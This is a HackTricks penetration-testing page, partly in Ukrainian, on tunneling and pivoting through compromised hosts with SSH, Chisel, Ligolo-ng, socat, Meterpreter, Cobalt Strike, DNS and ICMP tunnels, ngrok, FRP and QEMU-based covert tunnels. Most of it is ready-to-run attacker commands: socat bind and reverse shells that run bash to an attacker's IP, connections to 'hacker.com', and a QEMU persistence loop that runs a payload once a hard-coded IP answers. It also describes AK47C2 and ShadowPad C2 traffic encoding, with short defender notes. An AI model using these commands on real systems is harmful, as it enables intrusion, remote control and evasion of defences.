# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Порада Nmap

> [!WARNING]
> **ICMP** та **SYN** scans не можна тунелювати через socks proxies, тому потрібно **disable ping discovery** (`-Pn`) і вказати **TCP scans** (`-sT`), щоб це працювало.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH графічне з'єднання (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Відкрити новий Port в SSH Server --> інший Port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Локальний port --> Скомпрометований host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Локальний порт --> Компрометований хост (SSH) --> Куди завгодно
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Це корисно для отримання reverse shells з internal hosts через DMZ на ваш host:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Вам потрібен **root на обох пристроях** (оскільки ви збираєтеся створювати нові інтерфейси) і конфігурація sshd має дозволяти вхід як root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Увімкнути перенаправлення на стороні сервера
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Встановити новий маршрут на стороні клієнта
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Безпека – Terrapin Attack (CVE-2023-48795)**
> 2023 Terrapin downgrade attack може дозволити man-in-the-middle змінювати ранній SSH handshake та інжектити дані в **any forwarded channel** (`-L`, `-R`, `-D`). Переконайтеся, що як клієнт, так і сервер оновлені (**OpenSSH ≥ 9.6/LibreSSH 6.7**) або явно вимкніть уразливі `chacha20-poly1305@openssh.com` та `*-etm@openssh.com` алгоритми в `sshd_config`/`ssh_config` перед тим, як покладатися на SSH tunnels.

## SSHUTTLE

Ви можете **tunnel** via **ssh** весь **traffic** до **subnetwork** через хост.\
Наприклад, forwarding всього **traffic**, що йде до 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Підключення за допомогою private key
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Локальний порт --> Скомпрометований хост (активна сесія) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Інший спосіб:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Відкрийте порт у teamserver, що слухає на всіх інтерфейсах, який можна використати для **маршрутизації трафіку через beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> У цьому випадку **port відкривається на beacon host**, а не на Team Server, і трафік надсилається на Team Server, а звідти на вказаний host:port
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Зверніть увагу:

- Beacon's reverse port forward призначений для **тунелювання трафіку до Team Server, а не для ретрансляції між окремими машинами**.
- Трафік **тунелюється всередині Beacon's C2 traffic**, включаючи P2P links.
- **Admin privileges are not required** для створення reverse port forwards на високих портах.

### rPort2Port local

> [!WARNING]
> У цьому випадку **порт відкривається в beacon host**, не в Team Server, і **трафік відправляється до Cobalt Strike client** (не в Team Server) і звідти до вказаного host:port
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Потрібно завантажити web file tunnel: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Ви можете завантажити його зі сторінки релізів [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Вам потрібно використовувати **ту ж версію для client і server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Перенаправлення портів
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Використовуйте ту саму версію для agent і proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Прив'язка та прослуховування агента
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Доступ до локальних портів агента
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Зворотний тунель. Тунель ініціюється з боку жертви.\
Створюється socks4 proxy на 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot через **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port через socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter через SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Ви можете обійти **non-authenticated proxy**, виконавши цей рядок замість останнього рядка в консолі жертви:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Створіть сертифікати з обох сторін: Client та Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Підключити локальний SSH-порт (22) до порту 443 хоста нападника
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Це як консольна версія PuTTY (опції дуже схожі на ssh-клієнта).

Оскільки цей binary буде виконано на жертві і це ssh-клієнт, нам потрібно відкрити наш ssh-сервіс і порт, щоб мати reverse connection. Далі, щоб forward лише локально доступний порт на порт на нашій машині:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Потрібно бути local admin (для будь-якого порту)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Вам потрібен **доступ RDP до системи**.\
Завантажити:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Цей інструмент використовує `Dynamic Virtual Channels` (`DVC`) з Remote Desktop Service у Windows. DVC відповідає за **tunneling packets over the RDP connection**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

На вашому клієнтському комп'ютері завантажте **`SocksOverRDP-Plugin.dll`** ось так:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Тепер ми можемо **підключитися** до **victim** через **RDP** використовуючи **`mstsc.exe`**, і ми повинні отримати **повідомлення**, що **SocksOverRDP plugin is enabled**, і він буде **слухати** на **127.0.0.1:1080**.

**Підключіться** через **RDP** і завантажте та виконайте на victim машині бінарний файл `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Тепер підтвердіть на вашій машині (attacker), що порт 1080 прослуховується:
```
netstat -antb | findstr 1080
```
Тепер ви можете використовувати [**Proxifier**](https://www.proxifier.com/) **щоб проксувати трафік через цей порт.**

## Проксування GUI-додатків Windows

Ви можете змусити GUI-додатки Windows використовувати проксі за допомогою [**Proxifier**](https://www.proxifier.com/).\
У **Profile -> Proxy Servers** додайте IP і порт SOCKS-сервера.\
У **Profile -> Proxification Rules** додайте ім'я програми, яку потрібно proxify, та підключення до IP-адрес, які ви хочете proxify.

## NTLM proxy bypass

Раніше згаданий інструмент: **Rpivot**\
**OpenVPN** також може його обійти, встановивши ці опції у конфігураційному файлі:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Він автентифікується до proxy і прив'язує локальний port, який перенаправляється до зовнішнього сервісу, який ви вкажете. Потім ви можете використовувати будь-який інструмент через цей порт.\
Наприклад, перенаправлений порт 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Тепер, якщо, наприклад, ви налаштуєте на victim сервісі **SSH** прослуховування порт 443. Ви можете підключитися до нього через attacker порт 2222.\
Ви також можете використовувати **meterpreter**, який підключається до localhost:443, а attacker слухає на port 2222.

## YARP

Реверс-проксі, створений Microsoft. Ви можете знайти його тут: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root потрібен в обох системах для створення tun adapters та тунелювання даних між ними за допомогою DNS-запитів.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Тунель буде дуже повільним. Ви можете створити стиснене SSH-з'єднання через цей тунель, використовуючи:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

Створює канал C\&C через DNS. Не потребує root-привілеїв.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Ви можете використовувати [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) щоб запустити dnscat2 client у PowerShell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding за допомогою dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Зміна DNS у proxychains

Proxychains перехоплює виклик `gethostbyname` libc і тунелює tcp DNS-запит через socks proxy. За **замовчуванням** **DNS** сервер, який використовує proxychains, — **4.2.2.2** (вшито). Щоб змінити його, відредагуйте файл: _/usr/lib/proxychains3/proxyresolv_ і змініть IP. Якщо ви в **середовищі Windows**, можна вказати IP **domain controller**.

## Тунелі на Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Актор Storm-2603 створив двоканальний C2 ("AK47C2"), що зловживає лише вихідним трафіком **DNS** та простими **HTTP POST** запитами — двома протоколами, які рідко блокують у корпоративних мережах.

1. **DNS mode (AK47DNS)**
• Генерує випадковий 5-символьний SessionID (наприклад `H4T14`).  
• Додає на початок `1` для запитів завдань або `2` для результатів і конкатенує різні поля (flags, SessionID, computer name).  
• Кожне поле **XOR-зашифроване ASCII-ключем `VHBD@H`**, закодоване в hex і з'єднане крапками — в кінці вказано домен, контрольований атакуючим:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Запити використовують `DnsQuery()` для **TXT** (і як запасний варіант **MG**) записів.  
• Коли відповідь перевищує 0xFF байт, бекдор **фрагментує** дані на куски по 63 байти і вставляє маркери:
`s<SessionID>t<TOTAL>p<POS>`, щоб сервер C2 міг їх впорядкувати.

2. **HTTP mode (AK47HTTP)**
• Формує JSON-обгортку:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Весь бінарний блок проходить XOR-`VHBD@H` → hex → відправляється як тіло **`POST /`** з заголовком `Content-Type: text/plain`.  
• Відповідь кодується таким же способом, а поле `cmd` виконується через `cmd.exe /c <command> 2>&1`.

Blue Team notes
• Шукайте незвичні **TXT queries**, у яких перша мітка — довгий hex і які завжди закінчуються одним рідкісним доменом.  
• Постійний XOR-ключ, за яким йде ASCII-hex, легко виявити за допомогою YARA: `6?56484244?484` (`VHBD@H` у hex).  
• Для HTTP відмічайте text/plain POST тіла, які складаються виключно з hex і мають кількість байтів, кратну двом.

{{#note}}
Весь канал вкладається в **стандартні RFC-сумісні запити** і зберігає кожну піддоменну мітку менше 63 байт, що робить його малопомітним у більшості DNS-логів.
{{#endnote}}

## ICMP тунелювання

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

У обох системах потрібні права root для створення tun-адаптерів і тунелювання даних між ними з використанням ICMP echo requests.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Завантажити звідси**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **є інструментом, що дозволяє виставити сервіс в Інтернет однією командою.**\
_Exposition URI are like:_ **UID.ngrok.io**

### Встановлення

- Створіть акаунт: https://ngrok.com/signup
- Client download:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Базове використання

**Документація:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Також можливо додати аутентифікацію та TLS, якщо це необхідно._

#### Тунелювання TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Надання доступу до файлів через HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP запитів

_Корисно для XSS,SSRF,SSTI ..._\
Безпосередньо зі stdout або через HTTP-інтерфейс [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling внутрішнього HTTP сервісу
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml простий приклад конфігурації

Відкриває 3 тунелі:

- 2 TCP
- 1 HTTP, що обслуговує статичні файли з /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Демон `cloudflared` від Cloudflare може створювати вихідні тунелі, що відкривають доступ до **локальних TCP/UDP сервісів** без необхідності налаштовувати вхідні правила фаєрволу, використовуючи Cloudflare’s edge як точку зустрічі. Це дуже зручно, коли вихідний фаєрвол дозволяє лише HTTPS-трафік, а вхідні з'єднання блоковано.

### Швидка однорядкова команда для тунелю
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Постійні тунелі через DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Запустіть конектор:
```bash
cloudflared tunnel run mytunnel
```
Оскільки весь трафік залишає хост **outbound over 443**, Cloudflared tunnels — простий спосіб обійти ingress ACLs або NAT boundaries. Зверніть увагу, що бінарний файл зазвичай запускається з підвищеними привілеями – використовуйте контейнери або прапор `--user`, коли це можливо.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) є активно підтримуваним Go reverse-proxy, який підтримує **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**. Починаючи з **v0.53.0 (May 2024)** він може діяти як **SSH Tunnel Gateway**, тому цільовий хост може підняти зворотний тунель, використовуючи лише стандартний OpenSSH client – без додаткового бінарного файлу.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Використання нового SSH-шлюзу (без бінарного frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Вищевказана команда публікує порт жертви **8080** як **attacker_ip:9000** без розгортання додаткових інструментів — ідеально для living-off-the-land pivoting.

## Приховані тунелі на основі VM з QEMU

QEMU’s user-mode networking (`-netdev user`) підтримує опцію `hostfwd`, яка **прив'язує TCP/UDP порт на *host* і перенаправляє його в *guest***. Коли *guest* запускає повноцінний SSH daemon, правило hostfwd дає вам тимчасову SSH jump box, яка повністю існує всередині тимчасової VM — ідеально для приховування C2-трафіку від EDR, оскільки вся шкідлива активність і файли залишаються на віртуальному диску.

### Швидкий однорядковий приклад
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Вищевказана команда запускає образ **Tiny Core Linux** (`tc.qcow2`) у RAM.
• Порт **2222/tcp** на Windows host прозоро переспрямовується на **22/tcp** всередині guest.
• З точки зору attacker, target просто відкриває порт 2222; будь-які пакети, які досягають його, обробляються SSH server, що працює в VM.

### Запуск у прихованому режимі через VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Запуск сценарію за допомогою `cscript.exe //B update.vbs` приховує вікно.

### In-guest persistence

Оскільки Tiny Core є безстанним, зловмисники зазвичай:

1. Скидають payload у `/opt/123.out`
2. Додають в кінець `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Додають `home/tc` та `opt` до `/opt/filetool.lst`, щоб payload був упакований у `mydata.tgz` під час вимкнення.

### Why this evades detection

• На диск торкаються лише два непідписані виконувані файли (`qemu-system-*.exe`); драйвери або служби не встановлюються.  
• Продукти безпеки на хості бачать **benign loopback traffic** (фактичний C2 завершується всередині VM).  
• Сканери пам'яті ніколи не аналізують простір шкідливого процесу, тому що він знаходиться в іншій ОС.

### Defender tips

• Налаштуйте оповіщення про **unexpected QEMU/VirtualBox/KVM binaries** у шляхах, доступних для запису користувачем.  
• Блокуйте вихідні з'єднання, що походять від `qemu-system*.exe`.  
• Виявляйте рідкісні порти (2222, 10022, …), які починають слухати одразу після запуску QEMU.

## IIS/HTTP.sys relay nodes via `HttpAddUrl` (ShadowPad)

Ink Dragon’s ShadowPad IIS module перетворює кожен скомпрометований периферійний веб-сервер на двофункційний **backdoor + relay**, прив'язуючи приховані префікси URL безпосередньо на рівні HTTP.sys:

* **Налаштування за замовчуванням** – якщо JSON-конфіг модуля опускає значення, воно повертається до правдоподібних IIS значень за замовчуванням (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Таким чином доброзичливий трафік обробляється IIS з правильною брендовою відповіддю.
* **Перехоплення за шаблоном** – оператори подають список префіксів URL, розділених крапкою з комою (маски у хості + шляху). Модуль викликає `HttpAddUrl` для кожного запису, тож HTTP.sys спрямовує відповідні запити до шкідливого обробника *перш ніж* запит досягне модулів IIS.
* **Encrypted first packet** – перші два байти тіла запиту містять seed для кастомного 32-бітного PRNG. Кожен наступний байт XOR-иться з згенерованим keystream до парсингу протоколу:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – модуль підтримує два списки: “servers” (upstream nodes) і “clients” (downstream implants). Записи обрізуються, якщо heartbeat не надходить протягом ~30 секунд. Коли обидва списки непорожні, він спарює перший здоровий server з першим здоровим client і просто пропускає байти між їхніми сокетами, доки одна зі сторін не закриється.
* **Debug telemetry** – опційне логування фіксує source IP, destination IP і загальну кількість пересланих байтів для кожної пари. Розслідувачі використали ці сліди, щоб відтворити мережу ShadowPad, що охоплювала кілька жертв.

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
